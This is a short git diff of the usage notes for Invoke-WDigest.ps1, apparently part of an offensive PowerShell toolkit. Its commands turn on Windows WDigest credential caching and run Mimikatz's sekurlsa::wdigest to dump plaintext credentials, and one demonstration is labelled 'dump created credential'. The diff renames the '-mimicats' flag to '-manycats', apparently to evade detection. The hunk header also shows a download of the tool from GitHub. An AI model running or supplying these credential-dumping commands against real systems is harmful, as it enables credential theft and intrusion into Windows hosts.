@@ -19,16 +19,16 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Device
 Get-Help .\Invoke-WDigest.ps1 -full
 
 # Execute Mimikatz (interactive shell) without WDigest caching
-.\Invoke-WDigest.ps1 -wdigest 'false' -mimicats
+.\Invoke-WDigest.ps1 -wdigest 'false' -manycats
 
 #  Ativate WDigest caching + Execute Mimikatz sekurlsa::wdigest exit
-.\Invoke-WDigest.ps1 -wdigest 'true' -mimicats
+.\Invoke-WDigest.ps1 -wdigest 'true' -manycats
 
 
 [FAST DEMONSTRATION]
 
 ## Ativate WDigest caching + dump created credential
-.\Invoke-WDigest.ps1 -WDigest 'true' -mimicats -runas
+.\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas
 
 WORKFLOW
    - Invoke-WDigest.ps1 Ativates WDigest caching in memory
